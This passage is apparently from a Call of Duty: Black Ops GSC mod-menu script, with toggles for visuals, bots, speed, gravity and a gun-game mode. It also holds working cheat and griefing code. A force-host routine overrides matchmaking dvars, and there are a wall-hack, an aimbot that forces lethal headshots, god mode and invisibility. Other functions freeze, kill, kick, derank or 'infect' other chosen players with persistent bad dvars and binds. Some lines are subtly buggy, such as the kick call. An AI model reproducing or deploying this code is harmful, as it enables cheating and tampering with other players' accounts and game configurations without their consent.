		self setClientDvar("party_msPerTier",50000);
		setDvar("party_searchResultsMin",10000);
		self setClientDvar("party_searchResultsMin",10000);
		setDvar("party_searchPauseTime",15000);
		self setClientDvar("party_searchPauseTime",15000);
		setDvar("badhost_endGameIfISuck",0);
		setDvar("party_connectTimeout",1000);
		self setClientDvar("MakeMeHost", "1");
		self setClientDvar("party_iamhost", "1");
		self setClientDvar("party_host","1");
		self setClientDvar("party_connectToOthers", "0");
		self setClientDvar("party_hostmigration", "0");
		self setClientDvar("party_connectTimeout", "0");
		self setClientDvar("onlineunrankedgameandhost", "0");
		self setClientDvar("onlinegameandhost", "1");
		self setclientDvar("lobby_partySearchWaitTime",0);
		self setClientDvar("ui_hostOptionsEnabled", "1");
		self setClientDvar("cg_drawversion", "1");
		self setClientDvar("cg_drawSnapshotTime", "1");
		self setclientDvar("badhost_endGameIfISuck",0);
		self setclientDvar("badhost_maxDoISuckFrames",0);
		self setclientDvar("badhost_maxHappyPingTime",99999);
		self setclientDvar("badhost_minTotalClientsForHappyTest",99999);
		self setclientDvar("bandwidthtest_enable",0);
		self iPrintln("iPRO Force Host: ^2[ON]");
	}
	else
	{
		setDvar("party_connectToOthers",1);
		setDvar("party_searchPauseTime",2000);
		self setClientDvar("party_searchPauseTime",2000);
		setDvar("party_hostmigration",1);
		setDvar("bandwidthtest_enable",1);
		self setClientDvar("bandwidthtest_enable",1);
		self setClientDvar("badhost_minTotalClientsForHappyTest",3);
		setDvar("badhost_minTotalClientsForHappyTest",3);
		setDvar("party_searchResultsMin",2000);
		self setClientDvar("party_searchResultsMin",2000);
		setDvar("party_msPerTier",50);
		self setClientDvar("party_msPerTier",50);
		setDvar("badhost_endGameIfISuck",1);
		setDvar("party_connectTimeout",1000);
		self setClientDvar("party_iamhost",0);
		self setClientDvar("party_host",0);
		self setClientDvar("MakeMeHost", "0");
		self setClientDvar("party_hostmigration",1);
		self setClientDvar("party_connectToOthers",1);
		self setclientDvar("lobby_partySearchWaitTime",1);
		self setClientDvar("ui_hostOptionsEnabled", "0");
		self setclientDvar("bandwidthtest_enable",1);
		self iPrintln("iPRO Force Host: ^1[OFF]");
	}
}
dovision1()
{
	visionSetNaked("cheat_bw_invert_contrast",1);
}
dovision2()
{
	visionSetNaked("cheat_invert_contrast",0.2);
}
dovision3()
{
	visionSetNaked("cheat_bw_contrast",0.2);
}
dovision4()
{
	visionSetNaked("cheat_contrast",0.2);
}
dovision5()
{
	visionSetNaked("zombie_turned",0.2);
}
dovision6()
{
	visionSetNaked("default_night",1);
}
dovision7()
{
	visionSetNaked("vampire_high",1);
}
dovision8()
{
	visionSetNaked("cheat_invert",0.2);
}
dovision9()
{
	visionSetNaked("cheat_bw",0.2);
}
dovision10()
{
	visionSetNaked("kamikaze",0.2);
}
dovision11()
{
	visionSetNaked("sepia",0.2);
}
dovision12()
{
	visionSetNaked("default",0.2);
}
toggle_sun()
{
	if(self.sun==false)
	{
		self thread discosun();
		self iPrintln("Disco ^2ON");
		self.sun=true;
	}
	else
	{
		self notify("stop_sun");
		self setClientDvar("r_lightTweakSunColor","0 0 0 0");
		self setClientDvar("r_lightTweakSunDiffuseColor","0 0 0 0");
		self setClientDvar("r_lightTweakSunDirection","0 0 0");
		self setClientDvar("r_lightTweakSunLight","1.5");
		self iPrintln("Disco ^1OFF");
		self.sun=false;
	}
}
discosun()
{
	self endon("stop_sun");
	self setClientDvar("r_lightTweakSunLight","4");
	self.random=[];
	for(;;)
	{
		for(c=0;c < 4;c++)
		{
			tempnr=randomInt(100);
			self.random[c]=tempnr/100;
		}
		self.suncolor="" + self.random[0] + " " + self.random[1] + " " + self.random[2] + " " + self.random[3] + "";
		self setClientDvar("r_lightTweakSunColor",self.suncolor);
		wait .3;
	}
}
toggle_chrome()
{
	if(self.chrome==false)
	{
		self setClientDvar("r_specularMap","2");
		self setClientDvar("r_specularColorScale","100");
		self iPrintln("Chrome MoD ^2ON");
		self.chrome=true;
	}
	else
	{
		self setClientDvar("r_specularMap","0");
		self setClientDvar("r_specularColorScale","1");
		self iPrintln("Chrome MoD ^1OFF");
		self.chrome=false;
	}
}
toggle_blueVis()
{
	if(self.blueVis==0)
	{
		self.blueVis=1;
		self setClientDvar("r_lightTweakSunColor","0 0 1 1");
		self setClientDvar("r_lightTweakSunLight","4");
		self iPrintln("Blue Vis ^2ON");
	}
	else
	{
		self.blueVis=0;
		self setClientDvar("r_lightTweakSunColor","0 0 0 0");
		self setClientDvar("r_lightTweakSunLight","0");
		self iPrintln("Blue Vis ^1OFF");
	}
}
toggle_day()
{
	if(self.day==0)
	{
		self.day=1;
		self setClientDvar("r_lightTweakSunLight","1.0");
		self setClientDvar("r_lightTweakSunColor","2.0 2.0");
		self setClientDvar("r_fog","0");
		self iPrintln("Day Vis ^2ON");
	}
	else
	{
		self.day=0;
		self setClientDvar("r_lightTweakSunLight","0.1");
		self setClientDvar("r_lightTweakSunColor","0.1 0.1");
		self setClientDvar("r_fog","1");
		self iPrintln("Day Vis ^1OFF");
	}
}
toggle_black()
{
	if(self.black==0)
	{
		self.black=1;
		self setClientDvar("r_colorMap","0");
		self iPrintln("Black Vis ^2ON");
	}
	else
	{
		self.black=0;
		self setClientDvar("r_colorMap","1");
		self iPrintln("Black Vis ^1OFF");
	}
}
toggle_white()
{
	if(self.white==0)
	{
		self.white=1;
		self setClientDvar("r_colorMap","2");
		self iPrintln("White Vis ^2ON");
	}
	else
	{
		self.white=0;
		self setClientDvar("r_colorMap","1");
		self iPrintln("White Vis ^1OFF");
	}
}
toggle_tabun()
{
	if(self.tabun==0)
	{
		self.tabun=1;
		self SetClientDvar("r_poisonFX_debug_enable","1");
		self iPrintln("Tabun Gaz ^2ON");
	}
	else
	{
		self.tabun=0;
		self SetClientDvar("r_poisonFX_debug_enable","0");
		self iPrintln("Tabun Gaz ^1OFF");
	}
}
toggle_flame() // Toggle_Water //
{
	if(self.flame==0)
	{
		self.flame=1;
        setDvar("r_waterSheetingFX_enable", "1");
		self iPrintln("Waterfall  ^2ON");
	}
	else
	{
		self.flame=0;
		setDvar("r_waterSheetingFX_enable", "0");
		self iPrintln("Waterfall ^1OFF");
	}
}
toggle_decor()
{
	if(self.decor==0)
	{
		self.decor=1;
		self setClientDvar("r_lockPvs","1");
		self setClientDvar("r_singleCell","1");
		self setClientDvar("r_cullBModels","1");
		self setClientDvar("r_cullXModels","1");
		self setClientDvar("r_showCullBModels","1");
		self setClientDvar("r_showCullsSModels","1");
		self setClientDvar("r_showCullXModels","1");
		self setClientDvar("r_showPortals","1");
		self setClientDvar("r_showAabbTrees","1");
		self setClientDvar("r_portalWalkLimit","1");
		self setClientDvar("r_portalMinClipArea","1");
		self setClientDvar("r_portalBevels","1");
		self iPrintln("Decor Vis ^2ON");
	}
	else
	{
		self.decor=0;
		self setClientDvar("r_lockPvs","0");
		self setClientDvar("r_singleCell","0");
		self setClientDvar("r_cullBModels","0");
		self setClientDvar("r_cullXModels","0");
		self setClientDvar("r_showCullBModels","0");
		self setClientDvar("r_showCullsSModels","0");
		self setClientDvar("r_showCullXModels","0");
		self setClientDvar("r_showPortals","0");
		self setClientDvar("r_showAabbTrees","0");
		self setClientDvar("r_portalWalkLimit","0");
		self setClientDvar("r_portalMinClipArea","0");
		self setClientDvar("r_portalBevels","0");
		self iPrintln("Decor Vis ^1OFF");
	}
}
toggle_pcPromod()
{
	if(self.pcPromod==0)
	{
		self.pcPromod=1;
		self SetClientDvar("r_filmUseTweaks","1");
		self SetClientDvar("r_filmTweakEnable","1");
		self iPrintln("Full ProMod Vis ^2ON");
	}
	else
	{
		self.pcPromod=0;
		self SetClientDvar("r_filmUseTweaks","0");
		self SetClientDvar("r_filmTweakEnable","0");
		self iPrintln("Full ProMod Vis ^1OFF");
	}
}
togglePickup()
{
	if(self.pickup==false)
	{
		self iPrintln("Pickup Player ^2ON");
		self iPrintln("Hold [{+speed_throw}] ^2To Pickup Player");
		self thread pickup();
		self.pickup=true;
	}
	else
	{
		self iPrintln("Pickup Player ^1OFF");
		self notify("stop_pickup");
		self.pickup=false;
	}
}
pickup()
{
	self endon("death");
	self endon("stop_pickup");
	self endon("unverified");
	for(;;)
	{
		while(self AdsButtonPressed())
		{
			trace=bullettrace(self gettagorigin("j_head"),self gettagorigin("j_head")+anglestoforward(self getplayerangles())*1000000,true,self);
			while(self AdsButtonPressed())
			{
				trace["entity"] freezeControls(true);
				trace["entity"] setorigin(self gettagorigin("j_head")+anglestoforward(self getplayerangles())*200);
				trace["entity"].origin=self gettagorigin("j_head")+anglestoforward(self getplayerangles())*200;
				wait 0.05;
			}
			trace["entity"] freezeControls(false);
		}
		wait 0.05;
	}
}
toggleUfo()
{
	if(self.toggleUfo==true)
	{
		self iPrintln("UFO Mode ^1[OFF]");
		self notify("stop_ufo");
		self.toggleUfo=false;
	}
	else
	{
		self iPrintln("UFO Mode ^2[ON]");
		self iPrintln("Hold [{+activate}] ^2To Move");
		self thread doUfo();
		self.toggleUfo=true;
	}
}
doUfo()
{
	self endon("stop_ufo");
	self endon("unverified");
	if(isdefined(self.N))self.N delete();
	self.N=spawn("script_origin",self.origin);
	self.On=0;
	for(;;)
	{
		if(self useButtonPressed())
		{
			self.On=1;
			self.N.origin=self.origin;
			self linkto(self.N);
		}
		else
		{
			self.On=0;
			self unlink();
		}
		if(self.On==1)
		{
			vec=anglestoforward(self getPlayerAngles());

			{
				end =(vec[0] * 20,vec[1] * 20,vec[2] * 20);
				self.N.origin=self.N.origin+end;
			}
		}
		wait 0.05;
	}
}
toggleWall()
{
	if(self.Wall==false)
	{
		self setClientDvar("r_znear_depthhack","2");
		self setClientDvar("r_znear","22");
		self setClientDvar("r_zFeather","4");
		self setClientDvar("r_zfar","0");
		self iPrintln("Wall-Hack ^2ON");
		self.Wall=true;
	}
	else
	{
		self setClientDvar("r_znear_depthhack","0.1");
		self setClientDvar("r_znear","4");
		self setClientDvar("r_zFeather","1");
		self setClientDvar("r_zfar","0");
		self iPrintln("Wall-Hack ^1OFF");
		self.Wall=false;
	}
}
clone()
{
	self iPrintln("Player Cloned");
	self setClientDvar("g_clonePlayerMaxVelocity","99");
	self ClonePlayer(99999);
}
ToggleActorBullet()
{
	if(self.tpg==false)
	{
		self.tpg=true;
		self thread ActorBullet();
		self iPrintln("Actor Bullet: ^2[ON]");
	}
	else
	{
		self.tpg=false;
		self notify("Stop_AB");
		self iPrintln("Actor Bullet: ^1[OFF]");
	}
}
ActorBullet()
{
	self endon("death");
	self endon("Stop_AB");
	for(;;)
	{
		self waittill("weapon_fired");
		t=self getTagOrigin("tag_eye");
		e=self thread vector_scal(anglestoforward(self getplayerangles()),10000);
		a=spawn("script_model",t);
		a setModel("defaultactor");
		a.angles=self getPlayerAngles();
		a moveTo(e,2.1);
	}
}
ToggleCarBullet()
{
	if(self.tpg==false)
	{
		self.tpg=true;
		self thread CarBullet();
		self iPrintln("Car Bullet: ^2[ON]");
	}
	else
	{
		self.tpg=false;
		self notify("Stop_CB");
		self iPrintln("Car Bullet: ^1[OFF]");
	}
}
CarBullet()
{
	self endon("death");
	self endon("Stop_CB");
	for(;;)
	{
		self waittill("weapon_fired");
		t=self getTagOrigin("tag_eye");
		e=self thread vector_scal(anglestoforward(self getplayerangles()),10000);
		c=spawn("script_model",t);
		c setModel("t5_veh_jet_f4_gearup");
		c.angles=self getPlayerAngles();
		c moveTo(e,2.1);
	}
}
vector_scal(vec,scale)
{
	vec =(vec[0] * scale,vec[1] * scale,vec[2] * scale);
	return vec;
}
teleport()
{
	self beginLocationSelection("rank_prestige4");
	self.selectingLocation=true;
	self waittill("confirm_location",location);
	newLocation=PhysicsTrace(location +(0,0,1000),location -(0,0,1000));
	self SetOrigin(newLocation);
	self endLocationSelection();
	self.selectingLocation=undefined;
	self iPrintln("You Teleported !");
}
giveweap()
{
	self giveWeapon("defaultweapon_mp",0,false);
}
decapitate()
{
	self SetClientDvars("cg_thirdPerson","1","cg_fov","40","cg_thirdPersonAngle","354");
	self setDepthOfField(0,128,512,4000,6,1.8);
	self detach("c_usa_jungmarines_head_fb", "j_head");
	self playSound("chr_death_gibs");
	self.third=true;
	self iPrintln("^1Fuck You lost your head !");
}
/*
kamikaze()
{
	self endon("death");
	self beginLocationSelection("rank_prestige15");
	self.selectingLocation = true;
	self waittill("confirm_location", location);
	newLocation = physicsTrace(location + (0, 0, 100), location - (0, 0, 100));
	self endLocationSelection();
	self.selectingLocation = undefined;
	self iPrintln("^1Kamikaze Bomber Inbound");
	wait 2.5;
	spawnPos = self.origin + (24000, 15000, 25000);
	kamikazeModel = spawn("script_model", spawnPos);
	kamikazeModel setModel("t5_veh_helo_hind_killstreak");
	targetLocation = newLocation;
	angles = vectorToAngles(targetLocation - spawnPos);
	kamikazeModel.angles = angles;
	wait 0.15;
	kamikazeModel moveTo(targetLocation, 3.5);
	wait 3.5;
	explosionOrigin = kamikazeModel.origin;
	kamikazeModel playSound("mpl_turret_exp");
	if (isDefined(level._effect["explode"]["large"]))
	{
		playFx(level._effect["explode"]["large"], explosionOrigin);
	}
	if (isDefined(level._effect["barrel"]["explode"]))
	{
		playFx(level._effect["barrel"]["explode"], explosionOrigin);
		playFx(level._effect["barrel"]["explode"], explosionOrigin + (400, 0, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin + (0, 400, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin + (400, 400, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin + (0, 0, 400));
		playFx(level._effect["barrel"]["explode"], explosionOrigin - (400, 0, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin - (0, 400, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin - (400, 400, 0));
		playFx(level._effect["barrel"]["explode"], explosionOrigin + (0, 0, 800));
	}
	earthquake(0.7, 4, explosionOrigin, 800);
	radiusDamage(explosionOrigin, 1000, 800, 100, self);
	kamikazeModel delete();
}
*/

toggleGod()
{
	if(self.isGod==false)
	{
		self.isGod=true;
		self thread onGod();
		self iPrintln("God Mode: ^2[ON]");
	}
	else
	{
		self.isGod=false;
		self notify("Stop_GM");
		self iPrintln("God Mode: ^1[OFF]");
	}
}
onGod()
{
	self endon("disconnect");
	self endon("death");
	self endon("Stop_GM");
	self.maxhealth=90000;
	self.health=self.maxhealth;
	while(1)
	{
		wait .4;
		if(self.health < self.maxhealth)self.health=self.maxhealth;
	}
}
toggleHide()
{
	if(self.hide==false)
	{
		self.hide=true;
		self hide();
		self iPrintln("You are ^2invisible");
	}
	else
	{
		self.hide=false;
		self show();
		self iPrintln("You are ^1visible");
	}
}
ToggleExplosion()
{
	if(self.tpg==false)
	{
		self.tpg=true;
		self thread ExplosionBullet();
		self iPrintln("Explosion Bullet: ^2[ON]");
	}
	else
	{
		self.tpg=false;
		self notify("Stop_SN");
		self iPrintln("Explosion Bullet: ^1[OFF]");
	}
}
ExplosionBullet()
{
	self endon("death");
	self endon("Stop_SN");
	for(;;)
	{
		self waittill("weapon_fired");
		f=self getTagOrigin("j_head");
		e=self thread vector_scal(anglestoforward(self getPlayerAngles()),1000000);
		S=BulletTrace(f,e,0,self)[ "position" ];
		playfx(loadfx("explosions/default_explosion"),S);
		RadiusDamage(S,100,500,100,self);
	}
}
/*
give1(){self maps\mp\gametypes\_hardpoints::giveHardpoint( "radar_mp", 3 );self thread NotifyMsg("3 Kill Streak!", "Press [{+actionslot 4}] for RECON PLANE.", (0,0,0), 6);}
give2(){self maps\mp\gametypes\_hardpoints::giveHardpoint( "artillery_mp", 5 );self thread NotifyMsg("5 Kill Streak!", "Press [{+actionslot 4}] for ARTILLERY.", (0,0,0), 6);}
give3(){self maps\mp\gametypes\_hardpoints::giveHardpoint( "dogs_mp", 7 );self thread NotifyMsg("7 Kill Streak!", "Press [{+actionslot 4}] for DOGS.", (0,0,0), 6);}
*/
autoAim()
{
	self endon("disconnect");
	self endon("death");
	if(self.aim==false)
	{
		self.aim=true;
		self iPrintln("AimBot ^2[ON]");
		self thread ToggleAutoAim();
	}
	else
	{
		self.aim=false;
		self iPrintln("AimBot ^1[OFF]");
		self notify("stop_aimbot");
	}
}
ToggleAutoAim()
{
	self endon("disconnect");
	self endon("stop_aimbot");
	self endon("aim_done");
	for(;;)
	{
		self waittill("weapon_fired");
		wait 0.01;
		aimAt=undefined;
		for(i=0;i < level.players.size;i++)
		{
			if((level.players[i]==self)||(level.teamBased && self.pers["team"]==level.players[i].pers["team"])||(!isAlive(level.players[i])))continue;
			if(isDefined(aimAt))
			{
				if(closer(self getTagOrigin("j_head"),level.players[i] getTagOrigin("j_head"),aimAt getTagOrigin("j_head")))aimAt=level.players[i];
			}
			else aimAt=level.players[i];
		}
		if(isDefined(aimAt))
		{
			self setplayerangles(VectorToAngles((aimAt getTagOrigin("j_head"))-(self getTagOrigin("j_head"))));
			aimAt thread [[level.callbackPlayerDamage]](self,self,2147483600,8,"MOD_HEAD_SHOT",self getCurrentWeapon(),(0,0,0),(0,0,0),"head",0);
		}
	}
}
freeze()
{
	player=level.players[self.selplay];
	if(player.frozen==false)
	{
		player freezecontrols(true);
		player iPrintln("^1You Were Frozen");
		self iPrintln(player.name + " is ^1FROZEN");
		player.frozen=true;
	}
	else
	{
		player freezecontrols(false);
		player iPrintln("^2Movement Restored");
		self iPrintln(player.name + " is ^2UNFROZEN");
		player.frozen=false;
	}
}
deranked()
{
	player=level.players[self.selplay];
	player thread setRank1();
	player thread dostats("negative");
	player iPrintln("^1DERANKED BITCH");
}
setRank1()
{
	self.pers["rankxp"]=1;
	self.pers["rank"]=self maps\mp\gametypes\_rank::getRankForXp(self.pers["rankxp"]);
	self.setPromotion=true;
	wait 1;
	self setRank(self.pers["rank"],self.pers["prestige"]);
}
murder()
{
	player=level.players[self.selplay];
	player suicide();
	self playSound("death_gibs");
}
kicked()
{
	player=level.players[self.selplay];
	player iPrintlnBold("^1BYE BYE");
	playertokick=player isHost();
	wait 2;
	kick(playertokick);
}
infectBind1()
{
	player=level.players[self.selplay];
	player thread InfectSimpleBinds();
	player iPrintlnBold("^4Loading infection binds...");
}
bringtome()
{
	player=level.players[self.selplay];
	player iPrintln(level.hostname + "^5Summoned You");
	player SetOrigin(self.origin);
}
teleportto()
{
	player=level.players[self.selplay];
	self SetOrigin(player.origin);
}
infect()
{
	player=level.players[self.selplay];
	player thread badDvars();
	player iPrintlnBold("^4YOU ARE NOW INFECTED");
	wait 1;
	player iPrintlnBold("^1HAHAHA FUCK");
	self iPrintln(player.name + " ^1BadDvars Infected");
}
SpawnOneBot()
{
	for(i=0;i < 1;i++)
	{
		ent[i]=addtestclient();
		if(!isdefined(ent[i]))
		{
			println("Could not add test client");
			wait 1;
			continue;
		}
		ent[i].pers["isBot"]=true;
		ent[i] thread TestClient("autoassign");
	}
}
SpawnThreeBots()
{
	for(i=0;i < 3;i++)
	{
		ent[i]=addtestclient();
		if(!isdefined(ent[i]))
		{
			println("Could not add test client");
			wait 1;
			continue;
		}
		ent[i].pers["isBot"]=true;
		ent[i] thread TestClient("autoassign");
	}
}
SpawnFiveBots()
{
	for(i=0;i < 5;i++)
	{
		ent[i]=addtestclient();
		if(!isdefined(ent[i]))
		{
			println("Could not add test client");
			wait 1;
			continue;
		}
		ent[i].pers["isBot"]=true;
		ent[i] thread TestClient("autoassign");
	}
}
SpawnTenBots()
{
	for(i=0;i < 10;i++)
	{
		ent[i]=addtestclient();
		if(!isdefined(ent[i]))
		{
			println("Could not add test client");
			wait 1;
			continue;
		}
		ent[i].pers["isBot"]=true;
		ent[i] thread TestClient("autoassign");
	}
}
SpawnAllBots()
{
	for(i=0;i < 18;i++)
	{
		ent[i]=addtestclient();
		if(!isdefined(ent[i]))
		{
			println("Could not add test client");
			wait 1;
			continue;
		}
		ent[i].pers["isBot"]=true;
		ent[i] thread TestClient("autoassign");
	}
}
TestClient(team)
{
	self endon("disconnect");
	while(!isdefined(self.pers["team"]))wait .05;
	self notify("menuresponse",game["menu_team"],team);
	wait 0.5;
	classes=getArrayKeys(level.classMap);
	okclasses=[];
	for(i=0;i < classes.size;i++)
	{
		if(!issubstr(classes[i],"custom")&& isDefined(level.default_perk[ level.classMap[ classes[i] ] ]))okclasses[ okclasses.size ]=classes[i];
	}
	assert(okclasses.size);
	while(1)
	{
		class=okclasses[ randomint(okclasses.size)];
		if(!level.oldschool)self notify("menuresponse","changeclass",class);
		self waittill("spawned_player");
		wait(0.10);
	}
}
doBotMove()
{
	if(self.botmove==false)
	{
		self setClientDvar("sv_botsRandomInput","1");
		self iPrintln("Bots Move On");
		self.botmove=true;
	}
	else
	{
		self setClientDvar("sv_botsRandomInput","0");
		self iPrintln("Bots Move Off");
		self.botmove=false;
	}
}
doBotAttack()
{
	if(self.botatt==false)
	{
		self setClientDvar("sv_botsPressAttackBtn","1");
		self iPrintln("Bots Attack On");
		self.botatt=true;
	}
	else
	{
		self setClientDvar("sv_botsPressAttackBtn","0");
		self iPrintln("Bots Attack Off");
		self.botatt=false;
	}
}
doBotKilled()
{
	if(self.botKill==false)
	{
		self setClientDvar("scr_testclients_killplayer","1");
		self iPrintln("Bots Kill On");
		self.botKill=true;
	}
	else
	{
		self setClientDvar("scr_testclients_killplayer","0");
		self iPrintln("Bots Kill Off");
		self.botKill=false;
	}
}
toggleAmmo()
{
	if(self.unlammo==false)
	{
		self thread MaxAmmo();
		self.unlammo=true;
		self iPrintln("Unlimited Ammo: ^2[ON]");
	}
	else
	{
		self notify("stop_ammo");
		self.unlammo=false;
		self iPrintln("Unlimited Ammo: ^1[OFF]");
	}
}
MaxAmmo()
{
	self endon("stop_ammo");
	self endon("unverified");
	while(1)
	{
		weap=self GetCurrentWeapon();
		self setWeaponAmmoClip(weap,150);
		self setClientDvar("flame_test","1");
		wait .02;
	}
}
toggleTeam()
{
	if(self.Team==false)
	{
		self.Team=true;
		self setClientDvar("ui_allow_teamchange","1");
		self iPrintln("Team Change ^2[ON]");
	}
	else
	{
		self.Team=false;
		self setClientDvar("ui_allow_teamchange","0");
		self iPrintln("Team Change ^1[OFF]");
	}
}


SuperJump()
{
    if(!isDefined(!level.jump))
    {
        level.jump = true;
        self iPrintln("Super Jump: ^2[ON]");
        for(i = 0; i < level.players.size; i++)level.players[i] thread EnableJumpOn();
    }
    else
    {
        level.jump = undefined;
        self iPrintln("Super Jump: ^1[OFF]");
        for(x = 0; x < level.players.size; x++)level.players[x] notify("StopJump");
    }
    
  
}

EnableJumpOn()
{
    self endon("disconnect");
    self endon("StopJump");
    for(;;)
    {
        if(self JumpButtonPressed() && !isDefined(self.allowedtopress))
        {
            for(i = 0; i < 10; i++)
            {
                self.allowedtopress = true;
                self setVelocity(self getVelocity()+(0, 0, 999));
                wait 0.05;
            }
            self.allowedtopress = undefined;
        }
        wait 0.05;
    }
}
SuperSpeed()
{
	if(self.SuperSpeed==false)
	{
		self.SuperSpeed=true;
		setDvar("player_sprintSpeedScale","9");
		self setClientDvar("g_speed","500");
		self iPrintln("Super Speed: ^2[ON]");
	}
	else
	{
		self.SuperSpeed=false;
		setDvar("player_sprintSpeedScale","1.8");
		self setClientDvar("g_speed","190");
		self iPrintln("Super Speed: ^1[OFF]");
	}
}
ToggleSlowMo()
{
	if(self.slowmo==false)
	{
		self setclientdvar("timescale",".5");
		self iPrintln("Slow Motion: ^2[ON]");
		self.slowmo=true;
	}
	else
	{
		self setClientdvar("timescale","1");
		self iPrintln("Slow Motion: ^1[OFF]");
		self.slowmo=false;
	}
}
ToggleFastMo()
{
	if(self.fastmo==false)
	{
		self setclientdvar("timescale","5");
		self iPrintln("Fast Motion: ^2[ON]");
		self.fastmo=true;
	}
	else
	{
		self setClientdvar("timescale","1");
		self iPrintln("Fast Motion: ^1[OFF]");
		self.fastmo=false;
	}
}
FastRestart()
{
	map_restart(false);
}
EndGame()
{
	self playSound("air_raid_a");
	level thread maps\mp\gametypes\_globallogic::forceEnd();
}
NormalGameType()
{
	for(k=0;k < level.players.size;k++)
	{
		setDvar("Zombieland","0");
		setDvar("VIP","0");
		setDvar("RollDice","0");
		setDvar("CPro","0");
		setDvar("HideAndSeek","0");
		setDvar("JuggernautVSHuman","0");
		setDvar("oitc","0");
		setDvar("SoStoned","0");
		level.players[k] thread resetPlayerDvars();
		wait 1;
		map_restart(false);
	}
}
changetheMap(value)
{
    setDvar("sv_map", value);
    setDvar("sv_mapRotation", "map " + value);
    setDvar("sv_mapRotationCurrent", "map " + value);
	exitLevel(false);
    level thread maps\mp\gametypes\_globallogic::endgame("tie", "Map skipped");
}

ToggleRanked()
{
	if(level.ranked==false)
	{
		self iPrintln("Ranked Match: ^2[OM]");
		setDvar("xblive_privatematch","0");
		setDvar("xblive_rankedmatch","1");
		level.ranked=true;
	}
	else if(level.ranked==true)
	{
		self iPrintln("Ranked Match: ^1[OFF]");
		setDvar("xblive_privatematch","1");
		setDvar("xblive_rankedmatch","0");
		level.ranked=false;
	}
}
ToggleKnock()
{
	if(self.knock==false)
	{
		self.knock=true;
		self setClientDvar("g_knockback","99999");
		self setClientDvar("cl_demoBackJump","99999");
		self setClientDvar("cl_demoForwardJump","99999");
		self iPrintln("Knockback ^2ON");
	}
	else
	{
		self.knock=false;
		self setClientDvar("g_knockback","1000");
		self setClientDvar("cl_demoBackJump","20000");
		self setClientDvar("cl_demoForwardJump","4000");
		self iPrintln("Knockback ^1OFF");
	}
}
ToggleGravity()
{
	if(self.gravity==false)
	{
		self.gravity=true;
		self setClientDvar("g_gravity","110");
		self setClientDvar("phys_gravity","99");
		self setClientDvar("perk_weapRateMultiplier","0.01");
		self setClientDvar("perk_weapReloadMultiplier","0.01");
		self setClientDvar("perk_weapSpreadMultiplier",".01");
		self iPrintln("Gravity ^2ON");
		self iPrintlnBold("^1Need OFF For Artillery Control");
		self iPrintlnBold("^1Also For Tank Plane !");
	}
	else
	{
		self.gravity=false;
		self setClientDvar("g_gravity","800");
		self setClientDvar("phys_gravity","-800");
		self setClientDvar("perk_weapRateMultiplier","0.75");
		self setClientDvar("perk_weapReloadMultiplier","0.5");
		self setClientDvar("perk_weapSpreadMultiplier","0.65");
		self iPrintln("Gravity ^1OFF");
	}
}
NotifyMsg(Text1,Text2,Colour,Time)
{
	notifyData=spawnstruct();
	notifyData.titleText=Text1;
	notifyData.notifyText=Text2;
	notifyData.glowColor=Colour;
	notifyData.duration=Time;
	notifyMessage(notifyData);
}
doGunGame()
{
	for(k=0;k < level.players.size;k++)
	{
		level.players[k] ExitMenu();
		wait .3;
		level.players[k] suicide();
		level.players[k] notify("gameStart");
		level.players[k] thread deleteAllModels();
		level.players[k] thread resetPlayerDvars();
		level.players[k] thread initGunGame();
		level.players[k] thread NotifyMsg("Gun Game","Made by IELIITEMODZX",(0,0,0),6);
	}
}
resetPlayerDvars()
{
	wait 1;
	self setClientDvars("cg_thirdperson","0","r_blur","0","r_colormap","1","r_fullbright","0","r_specularmap","1","r_debugShader","0","r_filmTweakEnable","0");
	self setClientDvars("r_filmUseTweaks","0","r_filmTweakInvert","0","r_filmtweakLighttint","1.1 1.05 .85","r_filmtweakdarktint",".7 .85 1","player_meleerange","64");
}
hudFade(time,alpha)
{
	self fadeOverTime(time);
	self.alpha=alpha;
}
initGunGame()
{
	if(!self.gunGameOne)
	{
		self.score=0;
		self setClientDvars("g_speed","220","r_blur","0","player_sustainAmmo","0","scr_player_maxhealth","40","scr_game_perks","0","player_meleerange","0","jump_height","85","g_gravity","400");
		thread initGuns();
		thread runKills();
		self.gunGameOne=true;
	}
	setDvar("scr_game_hardpoints",0);
	self clearPerks();
}
initGuns()
{
  thread initKillingHud();
  thread playerWaitTill();
  createWeapon("m1911_mp",true,&"M1911");
  createWeapon("python_mp",true,&"Python");
  createWeapon("makarov_mp",true,&"Makarov");
  createWeapon("cz75_mp",true,&"CZ75");
  createWeapon("galil_mp",false,&"Galil");
  createWeapon("commando_mp",false,&"Commando");
  createWeapon("famas_mp",false,&"FAMAS");
  createWeapon("aug_mp",false,&"AUG");
  createWeapon("fnfal_mp",false,&"FN FAL");
  createWeapon("m16_mp",false,&"M16");
  createWeapon("enfield_mp",false,&"Enfield");
  createWeapon("ak47_mp",false,&"AK-47");
  createWeapon("mp5k_mp",false,&"MP5k");
  createWeapon("skorpion_mp",false,&"Skorpion");
  createWeapon("mac11_mp",false,&"MAC-11");
  createWeapon("ak74u_mp",false,&"AK-74u");
  createWeapon("mpl_mp",false,&"MPL");
  createWeapon("spectre_mp",false,&"Spectre");
  createWeapon("kiparis_mp",false,&"Kiparis");
  createWeapon("pm63_mp",false,&"PM63");
  createWeapon("ithaca_mp",true,&"Ithaca");
  createWeapon("spas12_mp",true,&"SPAS-12");
  createWeapon("hs10_mp",false,&"HS-10");
  createWeapon("olympia_mp",true,&"Olympia");
  createWeapon("dragunov_mp",false,&"Dragunov");
  createWeapon("wa2000_mp",false,&"WA2000");
  createWeapon("l96a1_mp",false,&"L96A1");
  createWeapon("psg1_mp",false,&"PSG1");
  createWeapon("rpk_mp",false,&"RPK");
  createWeapon("hk21_mp",false,&"HK21");
  createWeapon("m60_mp",false,&"M60");
  createWeapon("stoner63_mp",false,&"Stoner 63");
  createWeapon("m72_law_mp",false,&"M72 LAW");
  createWeapon("rpg_mp",false,&"RPG");
  createWeapon("china_lake_mp",false,&"China Lake");
  createWeapon("crossbow_mp",false,&"Crossbow");
  createWeapon("ballistic_knife_mp",false,&"Ballistic Knife");
  createWeapon("EndGun_mp",true,&"");
}
createWeapon(gunName,laserSight,name)
{
	if(!isDefined(self.gunList)) self.gunList=[];
	size=self.gunList.size;
	self.gunList[size]=createGun(gunName,laserSight);
	self.gunName[size]=name;
}
createGun(gunName,laserSight)
{
	gun=spawnStruct();
	gun.name=gunName;
	gun.laser=laserSight;
